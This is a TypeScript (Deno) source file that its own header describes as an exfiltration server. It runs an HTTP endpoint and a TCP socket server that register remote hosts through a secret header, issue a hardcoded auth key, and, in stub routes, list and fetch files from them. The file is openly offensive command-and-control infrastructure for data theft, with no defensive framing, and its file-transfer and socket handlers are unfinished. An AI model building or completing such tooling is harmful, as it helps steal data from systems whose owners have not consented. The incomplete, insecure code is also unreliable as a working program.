/**
 * This program is the exfiltration tool for the distant server.
 * You need to launch the distant server before the main.ts
 */
import { start } from "./utils/start.ts";
new start();

console.log('~~ Exfiltraton server started')

import { serve, Response } from "https://deno.land/std@0.104.0/http/server.ts";
import { Client, Event, Packet, Server } from "https://deno.land/x/tcp_socket@0.0.2/mods.ts";
const server = serve({ port: 16333 });
const server_socket = new Server({ port: 16334 });

let serverDB = []
let socketAuth = []

// =========================== MAIN ===========================


async function main(request) {
    let response:Response = {}

    //NOW let's play with the routes
    
    ///check if client / server side
    let isClientOrServer = clientOrServer(request)

    if(isClientOrServer === 'server'){
        response = await SERVER_SIDE_controler(request)
    } else if(isClientOrServer === 'client'){
        response = await CLIENT_SIDE_controler(request)
    } else {
        response.status = 418
    }

    request.respond(response);
}

async function SERVER_SIDE_controler(request){
    let response:Response = {}

    if(request.method == "POST"){
        let body = await getRequestBody(request)
        if(request.url === "/auth"){
            // this is a new server, we need to launch the AUTH service
            // generate a new AuthKey
            let authKey = "1234"

            serverDB.push({
                name: body.name,
                key: body.key,
                authKey: authKey,
                addInfo: {},
                aes: body.aes
            })
            let socketAUTH = {
                authKey: authKey,
                AES: "none",
            }
            socketAuth.push(socketAUTH)
            //respond to him with his WEBSOCKET auth
            response.body = JSON.stringify(socketAUTH)
        }
    } else {
        response.status = 418
    }

    return response
}

async function CLIENT_SIDE_controler(request){
    let response:Response = {}

    if(request.method == "GET"){
        if(request.url.startsWith("/list:")){
            // list all file of dir :${KEY}
        } else if(request.url.startsWith("/get:")){
            // get file :${KEY}
        }
    }


    return response
}

//utils function

async function getRequestBody(request) {
    let body = await Deno.readAll(request.body);
    return JSON.parse(new TextDecoder().decode(body));
}

function clientOrServer(request){
    //check if header ir-server is set to HIBVUIK
    try{
        if(request.headers.get('ir-server') === 'HIBVUIK'){
            return 'server'
        }
    } catch(err){}
    return 'client'
}


// =========================== SOCKET ===========================

// Server listen
server_socket.on(Event.listen, (server: Deno.Listener) => {
    let addr = server.addr as Deno.NetAddr;
    console.log(`Server listen ${addr.hostname}:${addr.port}`);
});
  
// Client connect
server_socket.on(Event.connect, (client: Client) => {
    console.log("New Client");
});
  
// Client close
server_socket.on(Event.close, (client: Client) => {
    console.log("Client close -");
});
  
// Server finish
server_socket.on(Event.shutdown, () => {
    console.log("Server is shutdown");
});
  
// Handle error
server_socket.on(Event.error, (e) => {
    console.error(e);
});
  

server_socket.on(Event.receive, async (client: Client, data: Packet, length: number) => {
    try{
        data = JSON.parse(data.toString())
        //faire la auth du client socket
        if(data.url === "/auth"){
            if(client.auth == undefined || !client.auth) {
                console.log('client ask to auth')
                client.authKey = data.authKey
                client.write('ok')
            }
        }
        //faire la gestion des demandes du client socket
    } catch(err){
        console.log(err)
    }
})

async function launchServerSocket() {
    await server_socket.listen();
}
launchServerSocket()

// ======================= LAUNCH THE SERVER =======================

// new interval
setInterval(() => {
    console.table(serverDB)
}, 5000)


//Launch

for await (const request of server) {
    if(["GET", "POST"].includes(request.method)){
        main(request)
    } else {
        request.respond({ status: 418 })
    }
}
